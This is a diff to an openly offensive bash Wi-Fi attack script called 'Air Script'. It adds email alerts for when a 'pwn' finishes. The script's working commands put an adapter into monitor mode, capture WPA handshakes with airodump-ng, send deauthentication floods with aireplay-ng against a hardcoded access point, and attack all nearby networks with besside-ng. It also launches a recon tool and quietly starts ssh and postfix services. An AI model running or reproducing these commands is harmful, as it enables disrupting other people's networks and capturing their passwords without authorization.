@@ -24,6 +24,13 @@ echo -e "[${Green}wlan0${White}] Enabled!"
 fi
 }
 
+
+checkServices () {
+sudo systemctl start postfix 
+sudo systemctl start ssh 
+
+}
+
 banner () {        ##### Banner #####
 echo -e "${Red}
 
@@ -53,7 +60,7 @@ echo -e "${Red}
 echo -e "${Yellow} \n             Hack the world!!!
       By using this you agree to the EULA."
 echo -e "${Green}\n                    Developed by: Liam Bendix"
-echo -e "${Green}                         Version: 1.0.4 Stable"
+echo -e "${Green}                         Version: 1.0.5 Stable"
 }
 
 menu () {        ##### Display available options #####
@@ -197,22 +204,95 @@ done
 
 
 AirScript() {
+notification
+}
+
+
+notification () {
+while true; do
+    read -p "Do you want to recive email notifications when it's done pwning?" yn
+    case $yn in
+        [Yy]* ) attackYes; break;;
+        [Nn]* ) attackNo;;
+        * ) echo "Please answer yes or no.";;
+    esac
+done
+}
+
+
+attackYes () {
+echo "Enter your email address for notifications: " email
+read email
+echo "Remember to check your spam folder!"
+sleep 3
 ./raspberry.sh
 monitor
-sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake wlan0mon > /dev/null &
-#sudo airodump-ng --bssid 30:B5:C2:9A:64:12 --channel 9 --output-format pcap --write handshake wlan0mon > /dev/null &
+#sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake wlan0mon > /dev/null &
+sudo airodump-ng --bssid 30:B5:C2:9A:64:12 --channel 11 --output-format pcap --write handshake wlan0mon > /dev/null &
 echo -e "[${Green}wlan0mon${White}] Sending DeAuth to target..."
-sudo aireplay-ng --deauth 20 -a $bssid wlan0mon
-#sudo aireplay-ng --deauth 20 -a 30:B5:C2:9A:64:12 wlan0mon
-sudo chmod -R 755 air-crack
+#sudo aireplay-ng --deauth 20 -a $bssid wlan0mon
+sudo aireplay-ng --deauth 20 -a 30:B5:C2:9A:64:12 wlan0mon
+sudo chmod -R 755 air-script
 sudo airmon-ng stop wlan0mon
 sudo ifconfig wlan0 up
 sudo systemctl start NetworkManager
-echo -e "[${Green}Status${White}] Done! Select 3 to crack captured password or select 4 to exit.."
+checkServices 
+sleep 10
+sendemail -f airscript@gmail.com -t $email -u "Air Script is done pwning!" -m "Pwn complete, ready for you to crack. Select option 3 to crack the password. This is a robot please do not reply. *BEEP BOOP* "
+
+
+
+}
+
+
+attackNo () {
+./raspberry.sh
+monitor
+#sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake wlan0mon > /dev/null &
+sudo airodump-ng --bssid 30:B5:C2:9A:64:12 --channel 11 --output-format pcap --write handshake wlan0mon > /dev/null &
+echo -e "[${Green}wlan0mon${White}] Sending DeAuth to target..."
+#sudo aireplay-ng --deauth 20 -a $bssid wlan0mon
+sudo aireplay-ng --deauth 20 -a 30:B5:C2:9A:64:12 wlan0mon
+sudo chmod -R 755 air-script
+sudo airmon-ng stop wlan0mon
+sudo ifconfig wlan0 up
+sudo systemctl start NetworkManager
+checkServices 
+
+
+}
+
+
+
+
+
+
+
+
+
+notification1 () {
+while true; do
+    read -p "Do you want to recive email notifications when it's done pwning?" yn
+    case $yn in
+        [Yy]* ) attackAllYes; break;;
+        [Nn]* ) attackAllNo;;
+        * ) echo "Please answer yes or no.";;
+    esac
+done
 }
 
 
 attackAll() {
+notification1
+}
+
+
+
+attackAllYes () {
+echo "Enter your email address for notifications: " email
+read email
+sleep 3
+echo "Remeber to check your spam folder!"
 ./raspberry2.sh
 sudo airmon-ng check kill
 sudo airmon-ng
@@ -223,7 +303,29 @@ sudo ifconfig wlan0 up
 sudo systemctl start NetworkManager
 sudo chmod -R 755 air-crack
 echo -e "[${Green}Status${White}] Done! Select 4 to exit..."
+checkservices
+sleep 10
+sendemail -f airscript@gmail.com -t $email -u "Air Script is done pwning!" -m "Pwn complete, ready for you to crack. Select option 3 to crack the password. This is a robot please do not reply. *BEEP BOOP*"
+
 }
+
+
+attackAllNo () {
+./raspberry2.sh
+sudo airmon-ng check kill
+sudo airmon-ng
+sudo airmon-ng start wlan0
+sudo besside-ng wlam0mon
+sudo airmon-ng stop wlan0mon
+sudo ifconfig wlan0 up
+sudo systemctl start NetworkManager
+sudo chmod -R 755 air-crack
+echo -e "[${Green}Status${White}] Done! Select 4 to exit..."
+checkservices
+notification1
+}
+
+
 
 
 FluxionMenu() {
@@ -487,7 +589,8 @@ echo -e "      ${Red}[${Blue}15${Red}] ${Green}Ezsploit"
 echo -e "      ${Red}[${Blue}16${Red}] ${Green}TheFatRat"
 echo -e "      ${Red}[${Blue}17${Red}] ${Green}Angry IP Scanner"
 echo -e "      ${Red}[${Blue}18${Red}] ${Green}Sn1per"
-echo -e "      ${Red}[${Blue}19${Red}] ${Green}Exit\n\n"
+echo -e "      ${Red}[${Blue}19${Red}] ${Green}Red Hawk"
+echo -e "      ${Red}[${Blue}20${Red}] ${Green}Exit\n\n"
 while true; do
 echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
 read -p "└─────►$(tput setaf 7) " option
@@ -547,7 +650,11 @@ case $option in
   Sn1per
   exit 0
      ;;
-  19) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
+  19) echo -e "\n[${Green}Selected${White}] Option 19 Red Hawk"
+  redhawk
+  exit 0
+     ;;
+  20) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
      exit 0
      ;;
   *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
@@ -689,6 +796,13 @@ sudo sniper
 }
 
 
+redhawk () {
+cd tools
+cd RED_HAWK
+php rhawk.php
+
+}
+
 
 Help()
 {        ##### Display available options #####
@@ -788,6 +902,7 @@ checkDependencies
 checkWiFiStatus
 banner
 menu
+checkServices 
 }
 
 targeted
